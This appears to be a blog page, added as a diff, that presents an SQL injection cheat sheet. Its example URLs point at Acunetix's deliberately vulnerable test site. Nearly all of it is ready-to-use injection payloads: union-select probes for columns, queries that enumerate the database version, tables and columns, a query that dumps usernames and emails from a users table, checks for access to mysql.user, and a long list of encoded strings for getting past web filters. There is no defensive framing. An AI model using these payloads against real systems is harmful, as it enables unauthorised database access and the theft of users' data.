@@ -1,0 +1,169 @@
+<H1>SQLi Cheat Sheet</h1>
+<b>SQL Cheat Sheet</b><br />
+<br />
+<br />
+Below is a working, non exhaustive list, of useful SQL injection variables used to extract data from databases and systems from the URL.<br />
+<br />
+If you have anything you feel could be added to any of the lists please feel free to write them in the comments and I'll update them accordingly.<br />
+<br />
+<b><i>Test number of Columns - Watch for Error</i></b><br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> order by <i>1,2,3,4</i><br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> order by <i>1,2,3,4</i> -- LIMIT 1<br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> -1 union&nbsp;<i>all</i>&nbsp;select&nbsp;<i>1</i>/*<br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> -1 union&nbsp;<i>all</i>&nbsp;select&nbsp;<i>2</i>/*<br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> -1 union&nbsp;<i>all&nbsp;</i>select&nbsp;<i>3</i>/*<br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> -1 union&nbsp;<i>all&nbsp;</i>select&nbsp;<i>4</i>/*<br />
+<br />
+<br />
+<b><i>Test Injectable Columns - Watch for visual indicators (WAF Filters)</i></b><br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> -1 union <i>all</i> select <i>1,2,3,4</i><br />
+<i>http://testphp.acunetix.com/listproducts.php?cat=1 -1 /*!UNiOn*/ /*!SeLEct*/ 1,database(),3,4,5,6,7,8,9,10,11 </i><br />
+<i>&nbsp;http://testphp.acunetix.com/listproducts.php?cat=1%20%20-1%20%20%20/**//*!12345UNION%20SELECT*//**/%201,database%28%29,3,4,5,6,7,8,9,10,11</i><br />
+<i>&nbsp;http://testphp.acunetix.com/listproducts.php?cat=1%20%20-1%20%20%20%20/**//*!50000UNION%20SELECT*//**/%201,database%28%29,3,4,5,6,7,8,9,10,11</i><br />
+<i>http://testphp.acunetix.com/listproducts.php?cat=1%20%20-1%20%20/**/UNION/**//*!50000SELECT*//**/%201,database%28%29,3,4,5,6,7,8,9,10,11</i><br />
+<i>http://testphp.acunetix.com/listproducts.php?cat=1%20%20-1%20%20%20/*!50000UniON%20SeLeCt*/%201,database%28%29,3,4,5,6,7,8,9,10,11</i><br />
+<i>--*See the 'Web filter Bypass Keywords' below for more*--</i><br />
+<br />
+<br />
+<i></i>
+<b><i>Enumerate Information</i></b><br />
+<div>
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> union <i>all&nbsp;</i>select <i>1,@@version,3,4</i><br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> union&nbsp;<i>all&nbsp;</i>select&nbsp;<i>1,hex(unhex(@@version)),3,4</i><br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> union&nbsp;<i>all&nbsp;</i>select&nbsp;<i>1,</i><span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;">convert(<i>@@version</i> using latin1)</span><i>,3,4</i><br />
+<br />
+<br />
+<b><i>Enumerate Database</i></b><br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> union <i>all&nbsp;</i>select <i>1,database(),3,4</i><br />
+<i></i><br />
+<i><br /></i>
+<b><i>Enumerate Tables</i></b></div>
+<div>
+<span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><i>http://testphp.acunetix.com/listproducts.php?cat=1</i> -1 union <i>all</i> select <i>1,2,3,4,5,6,7,8,table_name,10,11</i> from information_schema.tables</span><br />
+<span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><br /></span>
+<span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><br /></span>
+<b><span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><i>Enumerate Columns</i></span></b><br />
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> -1 union select <i>all</i> <i>1,2,column_name,4</i> from information_schema.columns where table_schema='<i>database'</i>&nbsp;and table_name='<i>table_name</i>' LIMIT 1,1 -- - LIMIT 1<br />
+<br />
+<b><i>Enumerate Raw Data</i></b><br />
+<span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><i>http://testphp.acunetix.com/listproducts.php?cat=1</i> union select <i>all</i> <i>1,2,3,4,5,6,</i>group_concat(<i>uname</i>,<i>0x10a</i>,<i>email</i>),8,9,10,11 FROM <i>users</i></span><br />
+<br />
+<b><span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><i>Confirm MYSQL version - If<span style="font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif;"> Returns true then <span style="font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif;">end value is true</span></span></i></span></b><br />
+<span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><i>http://testphp.acunetix.com/listproducts.php?cat=1<span style="font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif;"> </span>and<span style="font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif;"> </span>substring(@@version,1,1)=<b><span style="font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif;">4</span></b></i></span><br />
+<span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><i>http://testphp.acunetix.com/listproducts.php?cat=1<span style="font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif;"> </span>and<span style="font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif;"> </span>substring(@@version,1,1)=<b>5&nbsp;</b></i></span>
+<br />
+<span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><i><br /></i></span>
+<br />
+<i><b><span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;">Test if subselect works - If returns Tu<span style="font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif;">e then subselect works</span></span></b></i><br />
+testphp.acunetix.com/listproducts.php?cat=1 and (select 1)=1<br />
+<pre></pre>
+<pre><b>&nbsp;</b></pre>
+<i><b>If subselect works, test for mysql.user - if returns true then it works</b></i><br />
+<pre>testphp.acunetix.com/listproducts.php?cat=1 and (select 1 from mysql.user limit 0,1)=1</pre>
+<span style="background-color: white; color: #222222; font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif; font-size: 13.2px;"><i><span style="font-family: &quot;arial&quot; , &quot;tahoma&quot; , &quot;helvetica&quot; , &quot;freesans&quot; , sans-serif;">&nbsp;</span></i></span>
+</div>
+<br />
+<b>Injection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b><br />
+<br />
+@@hostname&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />
+@@tmpdir<br />
+@@datadir<br />
+@@basedir<br />
+@@log<br />
+@@log_bin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
+@@log_error &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
+@@binlog_format&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />
+@@time_format&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+@@date_format&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+@@ft_boolean_syntax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+@@innodb_log_group_home_dir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+@@new&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+@@version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+@@version_comment<br />
+@@version_compile_os<br />
+@@version_compile_machine<br />
+@@GLOBAL.have_symlink<br />
+@@GLOBAL.have_ssl<br />
+@@GLOBAL.VERSION<br />
+<br />
+version() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
+table_name()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+user()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+system_user()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+session_user()<br />
+database()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+column_name()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+collation(user())&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+collation(\N)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+schema()<br />
+UUID()<br />
+current_user()<br />
+current_user<br />
+<br />
+<br />
+dayname(from_days(401))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+dayname(from_days(402))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+dayname(from_days(403))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+dayname(from_days(404))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+dayname(from_days(405))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+dayname(from_days(406))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+dayname(from_days(407))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+<br />
+monthname(from_days(690))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+monthname(from_unixtime(1))<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
+collation(convert((1)using/**/koi8r))<br />
+<br />
+(select(collation_name)from(information_schema.collations)where(id)=1&nbsp; <br />
+(select(collation_name)from(information_schema.collations)where(id)=23&nbsp; <br />
+(select(collation_name)from(information_schema.collations)where(id)=36&nbsp; <br />
+(select(collation_name)from(information_schema.collations)where(id)=48&nbsp; <br />
+(select(collation_name)from(information_schema.collations)where(id)=50&nbsp; <br />
+------forever----<br />
+<br />
+<br />
+<b>Adding Gaps Between requests</b><br />
+<br />
+testtest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nospace &nbsp; &nbsp;0x1a<br />
+test*test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x2a<br />
+test:test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x3a<br />
+test::test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x3a3a<br />
+testJtest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; J &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x4a<br />
+testZtest &nbsp; &nbsp; &nbsp;Z &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x5a<br />
+testjtest &nbsp; &nbsp; &nbsp; &nbsp;j &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x6a<br />
+testztest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; z &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x7a<br />
+testtest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nospace &nbsp; &nbsp; 0x8a<br />
+testtest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nospace &nbsp; &nbsp; 0x9a<br />
+test test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SPACE &nbsp; &nbsp; 0x10a<br />
+<br />
+<br />
+<b>Web Filter Bypass 'union select' keyword strings</b><br />
+<br />
+<br />
+union select&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />
+!UNiOn*/ /*!SeLEct*/<br />
+/**//*!12345UNION SELECT*//**/<br />
+<pre>/**//*!50000UNION SELECT*//**/</pre>
+<pre>/**/UNION/**//*!50000SELECT*//**/</pre>
+<pre>/*!50000UniON SeLeCt*/</pre>
+<pre>union /*!50000%53elect*/</pre>
+<pre>/*!%55NiOn*/ /*!%53eLEct*/</pre>
+<pre>/*!u%6eion*/ /*!se%6cect*/</pre>
+<pre>%2f**%2funion%2f**%2fselect</pre>
+<pre>union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</pre>
+<pre>/*--*/union/*--*/select/*--*/</pre>
+<pre>/*!union*/+/*!select*/</pre>
+<pre>union+/*!select*/</pre>
+<pre>/**/union/**/select/**/</pre>
+<pre>/**/uNIon/**/sEleCt/**/</pre>
+<pre>/**//*!union*//**//*!select*//**/</pre>
+<pre>/*!uNIOn*/ /*!SelECt*/</pre>
+<pre>+union+distinct+select+</pre>
+<pre>+union+distinctROW+select+</pre>
+<pre>+UnIOn%0D%0ASeleCt%0D%0A&nbsp;</pre>
+<pre>/%2A%2A/union/%2A%2A/select/%2A%2A/</pre>
+<pre>%2f**%2funion%2f**%2fselect%2f**%2f</pre>
+<pre>union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A </pre>
+<br /></div>
+<div style='clear: both;'></div>
+</div>
